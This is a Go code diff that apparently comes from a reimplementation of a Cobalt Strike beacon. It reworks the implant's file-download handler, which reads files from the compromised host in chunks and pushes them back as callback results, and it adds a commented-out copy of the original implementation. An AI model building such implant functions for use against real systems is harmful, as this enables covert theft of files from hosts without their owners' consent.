@@ -141,7 +141,6 @@ func FileBrowse(b []byte) error {
 	return nil
 }
 
-// TODO make download async
 func Download(b []byte) error {
 	filePath := string(b)
 	filePath = strings.ReplaceAll(filePath, "\\", "/")
@@ -163,12 +162,10 @@ func Download(b []byte) error {
 		return err
 	}
 	// revert to async
-	// I just changed the requestID from randInt to incrementing from zero, then it works....
-	// even though sometimes the warning of replay attack warning still occur, download can be completed successfully
+	// the problem here is the race condition of counter's generation and sending, so I add a mutex in packet.PushResult
 	go func() {
 		var fileContent []byte
-		// 1M
-		fileBuf := make([]byte, 1024*1024)
+		fileBuf := make([]byte, config.DownloadSize)
 		for {
 			n, err := fileHandle.Read(fileBuf)
 			if err != nil && err != io.EOF {
@@ -188,6 +185,37 @@ func Download(b []byte) error {
 	}()
 	return nil
 }
+
+// CS original impl, use goroutine is much easier, and this impl also can't solve the race condition in other goroutine
+//func CheckDownload() {
+//	for i, download := range DownloadList {
+//		fileBuf := make([]byte, config.DownloadSize)
+//		// do I need seek offset?
+//		n, err := download.fileHandle.Read(fileBuf)
+//		if err != nil && err != io.EOF {
+//			// if error occurred, this download would fail, and remove current download
+//			packet.ErrorMessage(err.Error())
+//			DownloadFinish(i)
+//			continue
+//		}
+//		requestIDBytes := packet.WriteInt(download.requestId)
+//		result := util.BytesCombine(requestIDBytes, fileBuf[:n])
+//		packet.PushResult(packet.CALLBACK_FILE_WRITE, result)
+//		download.readLen += n
+//		if download.readLen == download.totalLen {
+//			packet.PushResult(packet.CALLBACK_FILE_CLOSE, requestIDBytes)
+//			DownloadFinish(i)
+//		}
+//	}
+//}
+//
+//func DownloadFinish(i int) {
+//	download := DownloadList[i]
+//	// ignore that error
+//	_ = download.fileHandle.Close()
+//	// remove that job
+//	DownloadList = append(DownloadList[:i], DownloadList[i+1:]...)
+//}
 
 func Remove(filePath string) error {
 	filePath = strings.ReplaceAll(filePath, "\\", "/")
